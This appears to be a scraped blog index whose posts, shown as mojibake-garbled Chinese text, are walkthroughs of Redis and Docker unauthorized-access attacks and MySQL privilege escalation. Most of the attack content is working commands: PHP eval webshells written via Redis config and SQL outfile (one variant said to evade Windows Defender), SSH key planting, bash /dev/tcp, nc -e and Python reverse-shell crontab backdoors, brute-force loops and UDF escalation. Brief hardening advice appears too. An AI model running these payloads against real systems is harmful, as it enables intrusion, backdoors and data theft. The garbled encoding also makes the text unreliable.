http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://www.m00nback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Python","slug":"Python","permalink":"http://www.m00nback.xyz/tags/Python/"}]},{"title":"æœªæˆæƒè®¿é—®æ€»ç»“","slug":"æœªæˆæƒè®¿é—®æ€»ç»“","date":"2020-04-05T15:33:21.000Z","updated":"2020-04-05T14:55:13.306Z","comments":true,"path":"2020/04/05/æœªæˆæƒè®¿é—®æ€»ç»“/","link":"","permalink":"http://www.m00nback.xyz/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æœªæˆæƒè®¿é—®çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æœªæˆæƒè®¿é—®çš„ç›¸å…³å†…å®¹ï¼ ç®€ä»‹æœªæˆæƒè®¿é—®æ¼æ´å¯ä»¥ç†è§£ä¸ºéœ€è¦å®‰å…¨é…ç½®æˆ–æƒé™è®¤è¯çš„åœ°å€ã€æˆæƒé¡µé¢å­˜åœ¨ç¼ºé™·å¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ä»è€Œå¼•å‘é‡è¦æƒé™å¯è¢«æ“ä½œã€æ•°æ®åº“æˆ–ç½‘ç«™ç›®å½•ç­‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ Redisæœªæˆæƒè®¿é—®ç®€ä»‹Redis æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ Key â€“ Value æ•°æ®åº“ã€‚Redis çš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šå¼¥è¡¥äº† memcached è¿™ç±» Key/Value å­˜å‚¨çš„ä¸è¶³åœ¨éƒ¨åˆ†åœºåˆå¯ä»¥å¯¹å…³ç³»æ•°æ®åº“èµ·åˆ°å¾ˆå¥½çš„è¡¥å……ä½œç”¨ã€‚ Redis é»˜è®¤æƒ…å†µä¸‹ä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šã€‚åœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªç»æˆæƒå°±è®¿é—®åˆ° Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚ æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨ Redis çš„ç›¸å…³æ–¹æ³•æˆåŠŸåœ°åœ¨ Redis æœåŠ¡å™¨ä¸Šå†™å…¥å…¬é’¥ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚ Redisæœªæˆæƒè®¿é—®åœ¨4.x/5.0.5ä»¥å‰ç‰ˆæœ¬ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨master/slaveæ¨¡å¼åŠ è½½è¿œç¨‹æ¨¡å—ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥åº“çš„æ–¹å¼æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å¤ç°è¿™é‡Œç›´æ¥ç”¨vulhubæ­ä¸€ä¸‹ç¯å¢ƒï¼Œæ­å»ºå¥½ç”¨nampæ‰«ä¸‹,æŸ¥çœ‹ä¸€ä¸‹Redisçš„è¯¦ç»†ä¿¡æ¯ 1nmap -A -p 6379 --script redis-info 47.97.210.141 ç”±äºç›®æ ‡ç¯å¢ƒæ²¡æœ‰å¼€å¯è®¤è¯(ç©ºå¯†ç )ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç™»é™†è¿›å» 1redis-cli -h 47.97.210.141 -p 6379 å¸¸è§çš„Rediså‘½ä»¤(ä¸åŒºåˆ†å¤§å°å†™)ï¼š 123456789101112ping #æŸ¥çœ‹rediså¯åŠ¨çŠ¶æ€ï¼Œè¿”å›PONGä¸ºæ­£å¸¸key * #æŸ¥çœ‹redisä¸­çš„æ‰€æœ‰é”®exists key #åˆ¤æ–­ä¸€ä¸ªé”®æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨è¿”å›1ï¼Œå¦åˆ™è¿”å›0del key [key...] #åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œè¿”å›åˆ é™¤çš„é”®çš„ä¸ªæ•°type key #è·å¾—é”®å€¼çš„æ•°æ®ç±»å‹set key value #ç»™é”®èµ‹å€¼mset key1 v1 key2 v2 key3 v3 #åŒæ—¶ç»™å¤šä¸ªé”®èµ‹å€¼get key #å–å€¼mget key1 key2 key3 #åŒæ—¶è·å–å¤šä¸ªé”®å€¼append key value #åœ¨å­—ç¬¦ä¸²åé¢è¿½åŠ å€¼ï¼Œå¦‚æœè¯¥é”®ä¸å­˜åœ¨å³ä¸ºä¸ºè¿™ä¸ªé”®èµ‹å€¼ï¼ˆè¯¥å‘½ä»¤ç¬¬äºŒä¸ªå‚æ•°éœ€è¦åŠ å¼•å·ï¼Œå› ä¸ºæœ‰å¯èƒ½è¿½åŠ ç©ºæ ¼ï¼Œæ‰€ä»¥è¦å¼•èµ·æ¥ï¼‰strlen key #è¿”å›é”®å€¼çš„é•¿åº¦ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å›0config #è·å–å’Œè®¾ç½®é…ç½® ç½‘ç«™å†™é©¬å¦‚æœç›®æ ‡æœåŠ¡å¼€çš„æœ‰webæœåŠ¡,å¹¶ä¸”å¯¹åº”ç›®å½•æœ‰å†™çš„æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥è¯•ç€å¾€ç½‘ç«™ç›®å½•å†™ä¸€ä¸ªwebshell 1234config set dir /var/www/html/config set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;save å¦‚æœç½‘ç«™ç›®å½•æ²¡æœ‰å†™æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨/tmpé‡Œå†™ï¼Œç„¶åæ‰¾æ–‡ä»¶åŒ…å«ä¹‹ç±»çš„æ¼æ´ çœŸå®ç¯å¢ƒçš„Redisæ•°æ®åº“ä¼šå¾ˆå¤§ï¼Œæˆ‘ä»¬ç›´æ¥saveçš„è¯ä¼šä¿å­˜ä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶ï¼Œè€Œä¸”é‡Œé¢ä¸å…æœ‰å½±å“webshellæ­£å¸¸æ‰§è¡Œçš„å› ç´ ï¼Œå› æ­¤ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ€è·¯å°±æ˜¯å°†Redisä¿å­˜çš„æ–‡ä»¶ä½œä¸ºä¸­é—´æ–‡ä»¶ï¼Œå†ç”¨è¿™ä¸ªä¸­é—´æ–‡ä»¶æ¥å†™shellï¼Œå¹¶ä¸”ä»å¤‡ä»½çš„æ–‡ä»¶é‡Œæ‰¾åˆ°ä¸€ä¸ªé å‰çš„é”®ï¼ŒæŠŠshellå†™å…¥å€¼é‡Œï¼Œå¯ä»¥æ„é€ ç±»ä¼¼ï¼š 123456&lt;?phpset_time_limit(0); //å–æ¶ˆæ‰§è¡Œæ—¶é—´é™åˆ¶$fp=fopen(&#x27;wtf.php&#x27;,&#x27;w&#x27;);fwrite($fp,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);exit(); ?&gt; å½“ç„¶æ²¡æœ‰é¡¾è™‘çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥ç”¨flushallåˆ åº“è·‘è·¯ ç»“åˆSSHå…å¯†ç ç™»å½•å¦‚æœRedisä½¿ç”¨rootç”¨æˆ·å¯åŠ¨ï¼Œå¹¶ä¸”å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚ åœ¨kali /root/.sshç›®å½•ä¸‹æ‰§è¡Œ 1234567ssh-keygen -t rsa(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; foo.txtcat foo.txt | redis-cli -h 47.97.210.141 -p 9997 -x set crackitredis-cli -h 47.97.210.141 -p 9997 config set dir /root/.ssh/ config set dbfilename &quot;authorized_keys&quot; save å‘½ä»¤æ‰§è¡Œè¿™é‡Œç›´æ¥ç”¨githubä¸Šå¤§ä½¬çš„expï¼šhttps://github.com/Ridter/redis-rce exp.soå¯ä»¥ä»è¿™é‡Œè·å¾—ï¼šhttps://github.com/n0b0dyCN/redis-rogue-server 1python3 redis-rce.py -r 47.97.210.141 -p 9997 -L 47.97.210.141 -f exp.so è®¡åˆ’ä»»åŠ¡åå¼¹shellRedisä»¥rootæƒé™è¿è¡Œæ—¶å¯ä»¥å†™crontabæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell 12345redis-cli -h 47.97.210.141 -p 9997set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/47.97.210.141/4444 0&gt;&amp;1\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave é˜²æŠ¤æ‰‹æ®µä¿®æ”¹redis.confç›‘å¬æœ¬æœºåœ°å€127.0.0.1 ä¿®æ”¹redis.confæ·»åŠ requirepass mypasswordè®¾ç½®è®¤è¯ ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œç¦ç”¨è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€ 123rename-command FLUSHALL &quot;&quot;rename-command CONFIG &quot;&quot;rename-command EVAL &quot;&quot; ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡ 1groupadd -r redis &amp;&amp; useradd -r -g redis redis iptables 1234567891011// accept## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT// drop## iptables -I INPUT -p tcp --dport 6379 -j DROP## iptables -I INPUT -p udp --dport 6379 -j DROP// ä¿å­˜è§„åˆ™å¹¶é‡å¯ iptables## service iptables save## service iptables restart Dockeræœªæˆæƒè®¿é—®ç®€ä»‹Docker æ˜¯ä¸€ä¸ªå¼€æºçš„å¼•æ“å¯ä»¥è½»æ¾åœ°ä¸ºä»»ä½•åº”ç”¨åˆ›å»ºä¸€ä¸ªè½»é‡çº§çš„ã€å¯ç§»æ¤çš„ã€è‡ªç»™è‡ªè¶³çš„å®¹å™¨ã€‚å¼€å‘è€…åœ¨ç¬”è®°æœ¬ä¸Šç¼–è¯‘æµ‹è¯•é€šè¿‡çš„å®¹å™¨å¯ä»¥æ‰¹é‡åœ°åœ¨ç”Ÿäº§ç¯å¢ƒä¸­éƒ¨ç½²åŒ…æ‹¬ VMsã€bare metalã€OpenStack é›†ç¾¤å’Œå…¶ä»–çš„åŸºç¡€åº”ç”¨å¹³å°Dockerã€‚ Docker Remote API æ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIï¼Œç›‘å¬åœ¨0.0.0.0:2375ã€‚å­˜åœ¨é—®é¢˜çš„ç‰ˆæœ¬åˆ†åˆ«ä¸º 1.3 å’Œ 1.6å› ä¸ºæƒé™æ§åˆ¶ç­‰é—®é¢˜å¯¼è‡´å¯ä»¥é€šè¿‡ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ª APIï¼Œé€šè¿‡è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»º containerï¼Œåˆ é™¤å·²æœ‰ containerï¼Œç”šè‡³æ˜¯è·å–å®¿ä¸»æœºçš„ shellã€‚ å¤ç°è¿˜æ˜¯ç”¨Vulhubä¸Šçš„ è®¿é—®/versionå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯ ä¹Ÿå¯ä»¥ç›´æ¥ç”¨dockerå‘½ä»¤ 1docker -H tcp://47.97.210.141:9375 version åŒæ ·æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå…¶å®ƒå‘½ä»¤ è®¡åˆ’ä»»åŠ¡åå¼¹shelléšæ„å¯åŠ¨ä¸€ä¸ªé•œåƒï¼Œæ²¡æœ‰çš„è¯pullä¸€ä¸ªï¼Œè¿™é‡Œç”¨çš„æ˜¯åŸºäºAlpine Linuxçš„è¶…å°å‹Dockeré•œåƒ,å¤§å°åªæœ‰å‡ å…† 1docker -H tcp://47.97.210.141:9375 pull alpine:latest æ¥ç€ 123456# å¯åŠ¨å®¹å™¨docker -H tcp://47.97.210.141:9375 run -id -v /:/tmp alpine:latest# åˆ—ä¸€ä¸‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨docker -H tcp://47.97.210.141:29375 ps# è¿›å…¥å®¹å™¨å¹¶æŠŠ/ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„/tmpç›®å½•ä¸‹docker -H tcp://47.97.210.141:9375 exec -it 7c99cec3c42a sh å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸæŒ‚è½½å¹¶å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œå†™åé—¨ï¼Œç„¶åé€€å‡º 1echo &#x27;* * * * * /usr/bin/nc 47.97.210.141 9000 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root ä¹Ÿå¯ä»¥å†™å…¥å…¶ä»–çš„,è§†ç¯å¢ƒè€Œå®šï¼Œæ¯”å¦‚python 1echo -e &quot;*/1 * * * * root /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#x27;\\n&quot; &gt;&gt; /etc/crontab åŒæ ·ï¼Œå¯ä»¥å°†åå¼¹shellçš„è„šæœ¬å†™å…¥å†™å…¥åˆ°/var/spool/cron/rootï¼ˆcentosç³»ç»Ÿï¼‰æˆ–/var/spool/cron/crontabs/root(ubuntuç³»ç»Ÿ) å†™sshå…¬é’¥å†™sshå…¬é’¥å’Œä¸Šé¢æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å†™æ–‡ä»¶å˜› 1ssh-keygen -t rsa æŠŠæ–‡ä»¶å†…å®¹æ”¾åˆ°ç›®æ ‡ä¸»æœº/root/.ssh/id_rsa.pubæ–‡ä»¶é‡Œå°±è¡Œäº† githubä¸Šæœ‰ä¸ªè„šæœ¬ï¼šhttps://github.com/Tycx2ry/docker_api_vul å¯ä»¥ç›´æ¥æ‰§è¡Œè„šæœ¬å†™è®¡åˆ’ä»»åŠ¡åå¼¹shellç­‰æ“ä½œ é˜²æŠ¤æ‰‹æ®µåœ¨ä¸å¿…éœ€çš„æƒ…å†µä¸‹ï¼Œä¸è¦å¯ç”¨ docker çš„ remote api æœåŠ¡ï¼Œå¦‚æœå¿…é¡»ä½¿ç”¨çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„åŠ å›ºæ–¹å¼ï¼š è®¾ç½® ACLï¼Œä»…å…è®¸ä¿¡ä»»çš„æ¥æº IP è¿æ¥ è®¾ç½® TLS è®¤è¯ï¼Œå®˜æ–¹çš„æ–‡æ¡£ä¸º Protect the Docker daemon socket ä¿®æ”¹ Docker çš„å¯åŠ¨å‚æ•°ï¼šå®šä½åˆ° DOCKER_OPTS ä¸­çš„ tcp://0.0.0.0:2375ï¼Œå°†0.0.0.0ä¿®æ”¹ä¸º127.0.0.1ï¼Œå°†é»˜è®¤ç«¯å£ 2375 æ”¹ä¸ºè‡ªå®šä¹‰ç«¯å£ å‚è€ƒï¼š https://www.runoob.com/redis/redis-tutorial.html https://www.cnblogs.com/Qsunshine/p/redis.html https://xz.aliyun.com/t/2320 https://www.secpulse.com/archives/39440.html","categories":[],"tags":[{"name":"æœªæˆæƒè®¿é—®","slug":"æœªæˆæƒè®¿é—®","permalink":"http://www.m00nback.xyz/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"Redis","slug":"Redis","permalink":"http://www.m00nback.xyz/tags/Redis/"},{"name":"Docker","slug":"Docker","permalink":"http://www.m00nback.xyz/tags/Docker/"}]},{"title":"Mysqlææƒæ€»ç»“","slug":"mysqlææƒæ€»ç»“","date":"2020-03-30T09:40:47.000Z","updated":"2020-04-28T07:29:27.863Z","comments":true,"path":"2020/03/30/mysqlææƒæ€»ç»“/","link":"","permalink":"http://www.m00nback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†mysqlææƒçš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†mysqlææƒçš„ç›¸å…³å†…å®¹ï¼ mysqlææƒç®€ä»‹æˆ‘ä¸ªäººç†è§£çš„mysqlææƒå°±æ˜¯é€šè¿‡sqlæ³¨å…¥ï¼Œçˆ†ç ´mysqlç”¨æˆ·å¯†ç ç­‰æ–¹å¼ä»è€Œè®©æˆ‘ä»¬å¯ä»¥æ‰§è¡Œsqlè¯­å¥ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šè¾¾åˆ°æ‰§è¡Œå‘½ä»¤ï¼Œè·å–ç”¨æˆ·æƒé™ç­‰ç­‰ï¼ CVE-2012-2122æ¼æ´ç®€ä»‹è¯¥æ¼æ´æ˜¯èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ï¼Œå½“è¿æ¥MariaDB/MySQLæ—¶ï¼Œè¾“å…¥çš„å¯†ç ä¼šä¸æœŸæœ›çš„æ­£ç¡®å¯†ç æ¯”è¾ƒï¼Œç”±äºä¸æ­£ç¡®çš„å¤„ç†ï¼Œä¼šå¯¼è‡´å³ä¾¿æ˜¯memcmp()è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œä¹Ÿä¼šä½¿MySQLè®¤ä¸ºä¸¤ä¸ªå¯†ç æ˜¯ç›¸åŒçš„ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦çŸ¥é“ç”¨æˆ·åï¼Œä¸æ–­å°è¯•å°±èƒ½å¤Ÿç›´æ¥ç™»å…¥SQLæ•°æ®åº“ã€‚ å½±å“ç‰ˆæœ¬å—å½±å“ç‰ˆæœ¬ï¼š MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not. MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not. æ¼æ´å¤ç°msfé‡Œé¢å·²ç»é›†æˆäº†åˆ©ç”¨æ¨¡å— 1234use auxiliary/scanner/mysql/mysql_authbypass_hashdumpset rhosts 127.0.0.1set rport 3306run ç„¶åè§£hashå°±è¡Œï¼Œè§£å‡ºæ¥ç™»é™† 1mysql -u root -P 9906 -h 127.0.0.1 -p å½“ç„¶çˆ†ç ´ç™»é™†çš„æ–¹å¼ä¸æ­¢è¿™ä¸€ç§ shellè„šæœ¬ï¼š 1for i in `seq 1 1000`; do mysql -u root -h 127.0.0.1 -P 9906 --password=bad 2&gt;/dev/null; done pythonè„šæœ¬ï¼š 1234#!/usr/bin/pythonimport subprocesswhile 1: subprocess.Popen(&quot;mysql -u root -h 47.97.210.171 -P 9906 --password=aaa&quot;, shell=True).wait() åˆ©ç”¨å†™shelloutfileå†™æ–‡ä»¶è¯¥æ“ä½œéœ€è¦å†™æ–‡ä»¶çš„ç›®å½•è¦æœ‰å†™æƒé™ï¼Œå¹¶ä¸”mysqlä¹Ÿè¦æœ‰å†™æ–‡ä»¶æƒé™ï¼Œéœ€è¦è¿›è¡Œä»¥ä¸‹æ›´æ”¹å‚æ•° secure_file_priv å‚æ•°æ˜¯åªè¯»å‚æ•°ï¼Œä¸èƒ½ä½¿ç”¨ SET GLOBAL è¯­å¥ä¿®æ”¹ï¼Œåªæœ‰ä¿®æ”¹ MySQL çš„é…ç½®æ–‡ä»¶å¹¶é‡å¯ MySQL æ‰èƒ½å¯¹æ­¤è¿›è¡Œä¿®æ”¹ã€‚ 12mysql&gt; SET GLOBAL secure_file_priv=&#x27;&#x27;;ERROR 1238 (HY000): Variable &#x27;secure_file_priv&#x27; is a read only variable ä¿®æ”¹mysql.ini æ–‡ä»¶ï¼Œåœ¨[mysqld] ä¸‹æ·»åŠ æ¡ç›®: secure_file_priv = ä¿å­˜ï¼Œé‡å¯mysqlã€‚ 123å€¼ä¸ºnull ï¼Œä¹Ÿå°±æ˜¯æ³¨é‡Šæ‰è¿™ä¸ªå‚æ•°æˆ–è€…secure_file_priv&#x3D;nullã€‚è¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºå€¼ä¸º&#x2F;tmp&#x2F; ï¼Œå³secure_file_priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; è¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œå³secure_file_priv&#x3D; è¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ ä»¥sqli-labsç¬¬ä¸€å…³ä¸ºä¾‹ 1?id=-1&#x27; union select 1,@@basedir,@@datadir%23 @@basediræ˜¯æŒ‡Mysqlçš„å®‰è£…ç›®å½•ï¼Œ@@datadiræ˜¯æŒ‡æ•°æ®åº“æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨webç›®å½•ï¼Œå¯ä»¥æ ¹æ®ä»¥ä¸Šçš„ä¿¡æ¯çŒœä¸€ä¸‹ ç„¶åå°±å¯ä»¥å†™é©¬äº† 1?id=1&#x27; union select 1,2,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23 è¿™ç§Windows Defenderç›´æ¥æ€äº†ï¼Œä¸‹é¢è¿™ä¸ªå¯ä»¥è¿‡Windows Defender 1?id=1&#x27; union select 1,2,&#x27;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23 å¯ä»¥ç›´æ¥ç”¨sqlmapå†™webshellæ–‡ä»¶ åˆ©ç”¨æ—¥å¿—å†™shellå‰ææ˜¯çŸ¥é“mysql rootç”¨æˆ·å¯†ï¼Œè¿™é‡Œä»¥phpmyadminä¸ºä¾‹ å¼€å¯æ—¥å¿—è®°å½• 1set global general_log=&#x27;on&#x27;; æ—¥å¿—æ–‡ä»¶å¯¼å‡ºæŒ‡å®šç›®å½• 1set global general_log_file=&#x27;C:/phpstudy/PHPTutorial/WWW/1.php&#x27;; è®°å½•sqlè¯­å¥å†™é©¬ 1select &#x27;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&#x27;; å…³é—­è®°å½• 1set global general_log=off; udfææƒudfææƒç®€ä»‹UDF(user-defined function)æ˜¯MySQLçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼Œä¹Ÿå¯ç§°ä¹‹ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå®ƒæ˜¯ç”¨æ¥æ‹“å±•MySQLçš„æŠ€æœ¯æ‰‹æ®µï¼Œå¯ä»¥è¯´æ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ï¼Œç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°æ¥å®ç°åœ¨MySQLä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨SQLè¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒæœ¬æœºå‡½æ•°å¦‚ABS()æˆ–SOUNDEX()ä¸€æ ·æ–¹ä¾¿ã€‚ åŠ¨æ€é“¾æ¥åº“ï¼šæ˜¯æŠŠç¨‹åºä»£ç ä¸­ä¼šä½¿ç”¨çš„å‡½æ•°ç¼–è¯‘æˆæœºå™¨ç ï¼Œä¸è¿‡æ˜¯ä¿å­˜åœ¨.dllæ–‡ä»¶ä¸­ã€‚å¦å¤–åœ¨ç¼–è¯‘æ—¶ï¼Œä¸ä¼šæŠŠå‡½æ•°çš„æœºå™¨ç å¤åˆ¶ä¸€ä»½åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ç¼–è¯‘å™¨åªä¼šåœ¨.exeçš„æ‰§è¡Œæ–‡ä»¶é‡Œï¼Œè¯´æ˜æ‰€è¦è°ƒç”¨çš„å‡½æ•°æ”¾åœ¨å“ªä¸€ä¸ª*.dllæ–‡ä»¶ã€‚ç¨‹åºæ‰§è¡Œä½¿ç”¨åˆ°è¿™äº›å‡½æ•°æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠdllæ–‡ä»¶ä¸­çš„å‡½æ•°æ‹¿å‡ºæ¥ç»™æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨ udfææƒçš„å‰ææ˜¯å·²çŸ¥mysqlä¸­rootçš„è´¦å·å¯†ç ï¼Œæˆ‘ä»¬åœ¨æ‹¿åˆ°webshellåï¼Œå¯ä»¥çœ‹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„config.phpé‡Œï¼Œä¸€èˆ¬éƒ½æœ‰mysqlçš„è´¦å·å¯†ç ã€‚åˆ©ç”¨rootæƒé™ï¼Œåˆ›å»ºå¸¦æœ‰è°ƒç”¨cmdå‡½æ•°çš„â€™udf.dllâ€™(åŠ¨æ€é“¾æ¥åº“)ã€‚å½“æˆ‘ä»¬æŠŠâ€™udf.dllâ€™å¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹å¼•å…¥Mysqlæ—¶ï¼Œå…¶ä¸­çš„è°ƒç”¨å‡½æ•°æ‹¿å‡ºæ¥å½“ä½œmysqlçš„å‡½æ•°ä½¿ç”¨ã€‚è¿™æ ·æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°æ‰è¢«å½“ä½œæœ¬æœºå‡½æ•°æ‰§è¡Œã€‚åœ¨ä½¿ç”¨CREAT FUNCITONè°ƒç”¨dllä¸­çš„å‡½æ•°åï¼Œmysqlè´¦å·è½¬åŒ–ä¸ºsystemæƒé™ï¼Œä»è€Œæ¥ææƒã€‚ å¤ç°å½“ç„¶udfææƒçš„å‰ææ˜¯å¼€å¯secure_file_privå‚æ•° é¦–å…ˆæˆ‘ä»¬è¦åˆ¤æ–­mysqlç‰ˆæœ¬ï¼Œæ ¹æ®ä¸åŒçš„ç‰ˆæœ¬ï¼š mysqlç‰ˆæœ¬ &lt; 5.2 , UDFå¯¼å‡ºåˆ°ç³»ç»Ÿç›®å½•c:/windows/system32/ mysqlç‰ˆæœ¬ &gt; 5.2 ï¼ŒUDFå¯¼å‡ºåˆ°å®‰è£…è·¯å¾„MySQL/lib/plugin/ï¼Œé»˜è®¤æ˜¯æ²¡pluginè·¯å¾„çš„ æŸ¥è¯¢æ’ä»¶å®‰è£…ç›®å½•ï¼š 1SHOW VARIABLES LIKE &#x27;%plugin%&#x27; å¤§é©¬ææƒè¿™é‡Œç”¨çš„æ˜¯ï¼šhttps://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php ä¸Šä¼ udf.php,ç™»å½•è¿›å»ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ¤æ–­mysqlç‰ˆæœ¬å†³å®šå‡ºå¯¼å‡ºdllæ–‡ä»¶ä½ç½® å…ˆç‚¹Create PluginDiråˆ›å»ºpluginç›®å½•ï¼Œç„¶åDump UDF â€“&gt; Create Function â€“&gt; Mysql_queryä¾æ¬¡å¯¼å‡ºdllåˆ°æŒ‡å®šç›®å½•ï¼Œå°†udfçš„è‡ªå®šä¹‰å‡½æ•°å¼•å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿åˆ°è¿™å°é¶æœºçš„ç®¡ç†å‘˜æƒé™ æƒ³è¦åˆ é™¤å‡½æ•°å¯ä»¥ç”¨ 12drop function shell; åˆ é™¤å‡½æ•°delete from mysql.func where name=&#x27;shell&#x27; åˆ é™¤å‡½æ•° æ‰‹å·¥ææƒå…ˆæŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿæ¶æ„ 1select @@version_compile_os, @@version_compile_machine; 